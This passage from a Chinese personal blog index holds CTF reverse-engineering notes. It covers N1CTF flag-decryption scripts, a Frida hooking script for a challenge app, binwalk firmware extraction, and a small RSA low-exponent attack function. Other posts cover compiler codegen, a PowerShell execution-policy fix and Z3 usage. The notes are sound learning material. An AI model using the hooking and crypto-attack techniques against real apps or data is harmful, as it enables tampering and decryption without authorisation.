a:</span><br><span class="line">    ra+=d[i]</span><br><span class="line">ra+=<span class="string">&#x27;=&#x27;</span></span><br><span class="line">flag1 = base64.b64decode(ra.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">print(<span class="string">&#x27;flag1:&#x27;</span>,flag1)</span><br><span class="line"></span><br><span class="line">iv = <span class="string">b&#x27;17b87f9aae8933ef&#x27;</span></span><br><span class="line">key = <span class="string">b&#x27;\&#x27;17b87f9aae8933efn1ctf&#123;&#125;&#x27;</span></span><br><span class="line">cipher = bytes([<span class="number">0xA5</span>, <span class="number">0xA4</span>, <span class="number">0x4C</span>, <span class="number">0xD</span>, <span class="number">0xD2</span>, <span class="number">0x52</span>, <span class="number">0x1E</span>, <span class="number">0x63</span>, <span class="number">0x54</span>, <span class="number">0xC5</span>, <span class="number">0x29</span>, <span class="number">0xFA</span>,<span class="number">0xE4</span>, <span class="number">0xEC</span>, <span class="number">0x1F</span>, <span class="number">0x27</span>,<span class="number">0x52</span>, <span class="number">0xD2</span>, <span class="number">0xF1</span>, <span class="number">0xB7</span>, <span class="number">0xE4</span>, <span class="number">0x1C</span>, <span class="number">0x61</span>, <span class="number">0x42</span>, <span class="number">0x77</span>, <span class="number">0x9F</span>, <span class="number">0x5D</span>, <span class="number">0xA1</span>, <span class="number">0x87</span>, <span class="number">0xA</span>, <span class="number">0xEC</span>, <span class="number">0x55</span>])</span><br><span class="line">aes = AES.new(mode=AES.MODE_CBC,iv=iv,key=key)</span><br><span class="line"><span class="comment"># 03b5029f16f7e605</span></span><br><span class="line">print(aes.decrypt(cipher))</span><br><span class="line">print(<span class="string">&#x27;n1ctf&#123;&#x27;</span>+str(flag1,encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">&#x27;03b5029f16f7e605&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>hook脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida,sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span>(<span class="params">message,data</span>):</span></span><br><span class="line">    print(message)</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&#x27;type&#x27;</span>]==<span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        print(<span class="string">&#x27;[*] &#123;0&#125;&#x27;</span>.format(message[<span class="string">&#x27;payload&#x27;</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    jscode = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&#x27;1.jsx&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        jscode = f.read()</span><br><span class="line">    p = frida.get_usb_device().attach(<span class="string">&#x27;com.nu1l.ctf&#x27;</span>)</span><br><span class="line">    script = p.create_script(jscode)</span><br><span class="line">    script.on(<span class="string">&#x27;message&#x27;</span>,on_message)</span><br><span class="line">    script.load()</span><br><span class="line">    sys.stdin.read()</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">print_string</span>(<span class="params">offset</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="built_in">module</span> = Process.findModuleByName(<span class="string">&quot;libnative-lib.so&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> base = <span class="built_in">module</span>.base;</span><br><span class="line">    <span class="built_in">console</span>.log(ptr(base.add(ptr(offset))).readCString());</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hook_native</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="built_in">module</span> = Process.findModuleByName(<span class="string">&quot;libnative-lib.so&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> base = <span class="built_in">module</span>.base;</span><br><span class="line">    <span class="keyword">var</span> sub_12930 = base.add(<span class="number">0x12930</span>);</span><br><span class="line">    Interceptor.attach(sub_12930, &#123;</span><br><span class="line">        onEnter: <span class="function"><span class="keyword">function</span>(<span class="params">args</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.arg0 = args[<span class="number">0</span>];</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;sub_12930 onEnter:&quot;</span>, hexdump(<span class="built_in">this</span>.arg0), <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">        &#125;, <span class="attr">onLeave</span>: <span class="function"><span class="keyword">function</span>(<span class="params">retval</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;sub_12930 onLeave:&quot;</span>, hexdump(retval));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">var</span> sub_122A0 = base.add(<span class="number">0x122A0</span>);</span><br><span class="line">    Interceptor.attach(sub_122A0, &#123;</span><br><span class="line">        onEnter: <span class="function"><span class="keyword">function</span>(<span class="params">args</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.arg0 = args[<span class="number">0</span>]</span><br><span class="line">            <span class="built_in">this</span>.arg1 = args[<span class="number">1</span>]</span><br><span class="line">            <span class="built_in">this</span>.arg2 = args[<span class="number">2</span>]</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;sub_122A0 onEnter: &quot;</span>,ptr(<span class="built_in">this</span>.arg0).readCString(),ptr(<span class="built_in">this</span>.arg1).readCString(),ptr(<span class="built_in">this</span>.arg2).readCString())</span><br><span class="line">&#125;, <span class="attr">onLeave</span>: <span class="function"><span class="keyword">function</span>(<span class="params">retval</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;sub_122A0 onLeave:&quot;</span>, hexdump(retval))</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    hook_native();</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(main);</span><br></pre></td></tr></table></figure>

<h2 id="Oh-my-julia"><a href="#Oh-my-julia" class="headerlink" title="Oh my julia"></a>Oh my julia</h2><blockquote>
<p>对于JIT型语言的技巧，就是找到编译后的代码</p>
<ol>
<li><p>当程序要求输入时断下</p>
</li>
<li><p>单步执行直到程序输出东西</p>
</li>
<li><p>在输入/常量flag部分下硬件断点</p>
</li>
</ol>
<p>之后就可以把编译后的代码dump下来用于后续分析</p>
</blockquote>
<p>// TODO 果然还是基本功，先做点简单的</p>
<h2 id="BabyOS"><a href="#BabyOS" class="headerlink" title="BabyOS"></a>BabyOS</h2><h3 id="binwalk使用指南"><a href="#binwalk使用指南" class="headerlink" title="binwalk使用指南"></a>binwalk使用指南</h3><ul>
<li><p>查看固件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk 文件名</span><br></pre></td></tr></table></figure>
</li>
<li><p>解压压缩包</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e 文件名 # 解压压缩包</span><br><span class="line">binwalk -eM -d depth 文件名 # M表示递归解压，depth为深度，不指定默认为8</span><br></pre></td></tr></table></figure>
</li>
<li><p>解压指定类型文件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e -D=type 文件名 # type是要解压的类型，我已知的elf,jpeg</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h3><p><a target="_blank" rel="noopener" href="https://github.com/hzcx998/xbook2">xbook2</a>操作系统是一个大学生写的，tqlOrzzzzzz。这个操作系统的信息可以使用strings看出来，其中有</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1564: D:&#x2F;Developmemts&#x2F;github&#x2F;xbook2&#x2F;src&#x2F;include&#x2F;xbook&#x2F;schedule.h</span><br></pre></td></tr></table></figure>

<p>从而找到这个操作系统相关的信息</p>
<p>运行操作系统，列出文件，发现一个n1ctf程序，可以运行。这个程序位于xbook2-file1.img，使用binwalk解出来</p>
<p>但是程序似乎是加密的。</p>
<p>使用binwalk扫第一个a.img，解出一个程序，丢进IDA，发现这是一个操作系统程序(因为看见kernel等字样了)</p>
<p>然后找到一个do_execute函数，这个函数里面发现了加密逻辑。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">v7 = sys_open(v17, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v7 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v19 = sys_open(<span class="string">&quot;/tmp/decrypt&quot;</span>, <span class="number">28</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v19 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = sys_lseek(v7, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">    sys_lseek(v7, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    v9 = kmalloc(v8);</span><br><span class="line">    v10 = v9;</span><br><span class="line">    <span class="keyword">if</span> ( v9 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( sys_read(v7, v9, v8) == v8 )</span><br><span class="line">      &#123;</span><br><span class="line">        v12 = <span class="built_in">strlen</span>(<span class="string">&quot;xpawqejc4654wqqwe123%#%3213&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v8 )</span><br><span class="line">        &#123;</span><br><span class="line">          v13 = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            *(_BYTE *)(v10 + v13) ^= aXpawqejc4654wq[v13 % v12] ^ (<span class="keyword">unsigned</span> __int8)v13;</span><br><span class="line">            ++v13;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( v13 != v8 );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( sys_write(v19, v10, v8) == v8 )</span><br><span class="line">        &#123;</span><br><span class="line">          kfree(v10);</span><br><span class="line">          sys_close(v19);</span><br><span class="line">          sys_close(v7);</span><br><span class="line">          v14 = sys_open(<span class="string">&quot;/tmp/decrypt&quot;</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v14 &gt;= <span class="number">0</span> )用</span><br></pre></td></tr></table></figure>

<p>使用这个解密出n1ctf程序</p>
<h3 id="n1ctf程序"><a href="#n1ctf程序" class="headerlink" title="n1ctf程序"></a>n1ctf程序</h3><p>// TODO</p>
<h2 id="BabyCompiler"><a href="#BabyCompiler" class="headerlink" title="BabyCompiler"></a>BabyCompiler</h2><p>// TODO</p>
<h2 id="Fixed-Camera"><a href="#Fixed-Camera" class="headerlink" title="Fixed Camera"></a>Fixed Camera</h2><p>是一个il2cpp程序</p>
<p>il2cpp编译后的逻辑位于GameAssembly.dll中，但是不知道函数都是啥，而且函数很多。</p>
<p>使用il2cppdump解出Assembly-Csharp.dll，可以找到函数的函数名和VA，再回头看GameAssembly.dll，可以分析。</p>
<p>patch cam的Update函数，把负数的限制扩大，然后就可以获得flag了</p>
<p>在移动过程中可能有加密，但是到-50时出现flag</p>
<p><code>n1ctf&#123;enbrypt_value&#125;</code></p>
<h2 id="rrr"><a href="#rrr" class="headerlink" title="rrr"></a>rrr</h2><p>// 此题看不懂</p>
<h2 id="N1vault"><a href="#N1vault" class="headerlink" title="N1vault"></a>N1vault</h2><p>// TODO</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-note/rev/buuoj-1" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/10/18/note/rev/buuoj-1/" class="article-date">
  	<time datetime="2020-10-18T11:05:12.000Z" itemprop="datePublished">2020-10-18</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/18/note/rev/buuoj-1/">
        buuoj中学到的东西
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="键盘扫描码"><a href="#键盘扫描码" class="headerlink" title="键盘扫描码"></a>键盘扫描码</h2><p>问题来源于逆向题BabyDirver</p>
<p>这道题本来是迷宫问题，判断条件是37,38。这里是键盘扫描码，和ascii码不同。</p>
<p>注意驱动中的编码问题。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1] <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43876357/article/details/108523865">buuoj-babydriver</a></p>
<p>[2] <a target="_blank" rel="noopener" href="https://www.supfree.net/search.asp?id=6386">键盘扫描码</a></p>
<h2 id="二叉树的还原"><a href="#二叉树的还原" class="headerlink" title="二叉树的还原"></a>二叉树的还原</h2><p>问题来自于buuoj[2019红帽杯]childRE</p>
<p>二叉树，给定先序和中序遍历，还原过程如下</p>
<p>先序遍历中，根节点总是第一个遍历，找到根节点之后就可以在中序遍历中分开左右子树节点。在左右子树中分别应用这个规律。</p>
<p>给定后续遍历时，根节点总是最后一个被遍历，还原过程和先序遍历类似</p>
<h2 id="MSVC预定义宏"><a href="#MSVC预定义宏" class="headerlink" title="MSVC预定义宏"></a>MSVC预定义宏</h2><p>__FUNCDNAME__定义为封闭函数修饰名的字符串文本，这个宏只在函数中定义</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Demonstrates functionality of __FUNCTION__, __FUNCDNAME__, and __FUNCSIG__ macros</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exampleFunction</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Function name: %s\n&quot;</span>, __FUNCTION__);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Decorated function name: %s\n&quot;</span>, __FUNCDNAME__);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Function signature: %s\n&quot;</span>, __FUNCSIG__);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sample Output</span></span><br><span class="line">    <span class="comment">// -------------------------------------------------</span></span><br><span class="line">    <span class="comment">// Function name: exampleFunction</span></span><br><span class="line">    <span class="comment">// Decorated function name: ?exampleFunction@@YAXXZ</span></span><br><span class="line">    <span class="comment">// Function signature: void __cdecl exampleFunction(void)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以用UnDecorateSymbolName进行反修饰得到函数签名</p>
<p>修饰名是链接器用于查找方法使用的</p>
<p>参考资料 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/cpp/preprocessor/predefined-macros?view=vs-2019">预定义宏 | Microsoft Docs</a></p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/cpp/build/reference/decorated-names?view=vs-2019">修饰名 | Microsoft Docs</a></p>
<h2 id="bool类型比较和赋值"><a href="#bool类型比较和赋值" class="headerlink" title="bool类型比较和赋值"></a>bool类型比较和赋值</h2><p>示例代码</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> a=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">bool</span> b=<span class="number">2</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,a==b); <span class="comment">// 1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>汇编代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.LC0:</span><br><span class="line">        .string &quot;%d\n&quot;</span><br><span class="line">main:</span><br><span class="line">        push    rbp</span><br><span class="line">        mov     rbp, rsp</span><br><span class="line">        sub     rsp, 16</span><br><span class="line">        mov     BYTE PTR [rbp-1], 1</span><br><span class="line">        mov     BYTE PTR [rbp-2], 1</span><br><span class="line">        movzx   eax, BYTE PTR [rbp-1]</span><br><span class="line">        cmp     al, BYTE PTR [rbp-2]</span><br><span class="line">        sete    al</span><br><span class="line">        movzx   eax, al</span><br><span class="line">        mov     esi, eax</span><br><span class="line">        mov     edi, OFFSET FLAT:.LC0</span><br><span class="line">        mov     eax, 0</span><br><span class="line">        call    printf</span><br><span class="line">        mov     eax, 0</span><br><span class="line">        leave</span><br><span class="line">        ret</span><br></pre></td></tr></table></figure>

<p>可以看到，编译器是通过cmp,setne命令组合赋值的</p>
<p>那如果是变量赋值呢</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> a=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> b=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">bool</span> c=b;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,a==c);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.LC0:</span><br><span class="line">        .string &quot;%d\n&quot;</span><br><span class="line">main:</span><br><span class="line">        push    rbp</span><br><span class="line">        mov     rbp, rsp</span><br><span class="line">        sub     rsp, 16</span><br><span class="line">        mov     BYTE PTR [rbp-1], 1</span><br><span class="line">        mov     DWORD PTR [rbp-8], 2</span><br><span class="line">        cmp     DWORD PTR [rbp-8], 0</span><br><span class="line">        setne   al</span><br><span class="line">        mov     BYTE PTR [rbp-9], al</span><br><span class="line">        movzx   eax, BYTE PTR [rbp-1]</span><br><span class="line">        cmp     al, BYTE PTR [rbp-9]</span><br><span class="line">        sete    al</span><br><span class="line">        movzx   eax, al</span><br><span class="line">        mov     esi, eax</span><br><span class="line">        mov     edi, OFFSET FLAT:.LC0</span><br><span class="line">        mov     eax, 0</span><br><span class="line">        call    printf</span><br><span class="line">        mov     eax, 0</span><br><span class="line">        leave</span><br><span class="line">        ret</span><br></pre></td></tr></table></figure>

<h2 id="MFC程序逆向"><a href="#MFC程序逆向" class="headerlink" title="MFC程序逆向"></a>MFC程序逆向</h2><p>出自[HDCTF2019]MFC</p>
<p>可以使用xspy查看程序收到消息的函数，发送消息需要先找到窗体再发送消息</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="RSA低加密指数攻击和低解密指数攻击"><a href="#RSA低加密指数攻击和低解密指数攻击" class="headerlink" title="RSA低加密指数攻击和低解密指数攻击"></a>RSA低加密指数攻击和低解密指数攻击</h2><p>来自rsa2</p>
<p>rsa加密原理:$c=a^e(mod n)$，则$c+i*n=a^e$，如果e和a不太大，则$a^e$也不会太大，此时$i$就不会太大，可以通过穷举$i$然后开方达到解密目的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">att</span>(<span class="params">e,n,c,maxi=<span class="number">127</span></span>):</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(maxi):</span><br><span class="line">                a,ok = gmpy2.iroot(c+i*n)</span><br><span class="line">                <span class="keyword">if</span> ok:</span><br><span class="line">                        <span class="keyword">return</span> a</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/pablocelayes/rsa-wiener-attack">https://github.com/pablocelayes/rsa-wiener-attack</a></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-note/win/win-1" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/10/18/note/win/win-1/" class="article-date">
  	<time datetime="2020-10-18T05:28:34.000Z" itemprop="datePublished">2020-10-18</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/18/note/win/win-1/">
        power shell 禁止执行脚本的解决方法
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>Windows Power Shell执行脚本有一定的策略</p>
<ul>
<li>Restricted 不允许任何脚本执行</li>
<li>AllSigned RemoteSigned 防止执行未签名脚本</li>
</ul>
<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><ol>
<li><p>使用</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">get-executionpolicy</span></span><br></pre></td></tr></table></figure>

<p>获取脚本执行策略，一般情况为restricted</p>
</li>
<li><p>使用</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set-executionpolicy</span> remotesigned</span><br></pre></td></tr></table></figure>

<p>将策略设置为远程脚本需要签名，需要管理员权限</p>
</li>
</ol>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1] <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/4eaad2163567">PowerShell：因为在此系统上禁止运行脚本，解决方法</a></p>
<h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><p>:peach:</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-note/rev/z3" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/10/18/note/rev/z3/" class="article-date">
  	<time datetime="2020-10-18T05:12:57.000Z" itemprop="datePublished">2020-10-18</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/18/note/rev/z3/">
        Z3使用简介
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>z3是巨硬开发的开源线性约束求解器</p>
<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><ol>
<li>Int</li>
<li>Real</li>
<li>BitVec</li>
<li>文档</li>
</ol>
<h2 id="使用一般步骤"><a href="#使用一般步骤" class="headerlink" title="使用一般步骤"></a>使用一般步骤</h2><ol>
<li><p>定义数据类型</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = Int(<span class="string">&#x27;a&#x27;</span>) <span class="comment"># 定义一个数学上的整数整数</span></span><br><span class="line">x = [BitVec(<span class="string">&#x27;x%d&#x27;</span>%i,<span class="number">32</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">6</span>] <span class="comment"># 定义6个32位整数型位向量，就是C/C++中的int</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>添加约束</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s &#x3D; Solver()</span><br><span class="line">s.add(x[0]+x[1]&lt;10)</span><br><span class="line">s.add(x[0]&#x3D;&#x3D;2)</span><br><span class="line">s.add(x[0]+x[3]&#x3D;&#x3D;5)</span><br></pre></td></tr></table></figure>
</li>
<li><p>求解</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">res = []</span><br><span class="line"><span class="keyword">if</span> s.check()==sat: <span class="comment">#如果约束满足</span></span><br><span class="line">    m = s.model() <span class="comment"># 满足的模型</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">        res.append(i.as_long()) <span class="comment"># 转化为长整型</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>上述情况只能找到一种满足情况的解，可能存在溢出</p>
</li>
</ol>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1] <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/30548907">z3一把梭</a></p>
<p>[2] [vscode自动补全功能]</p>
<h2 id="附件"><a href="#附件" class="headerlink" title="附件"></a>附件</h2><p>全部代码(这个例子溢出，所以不相等)</p>
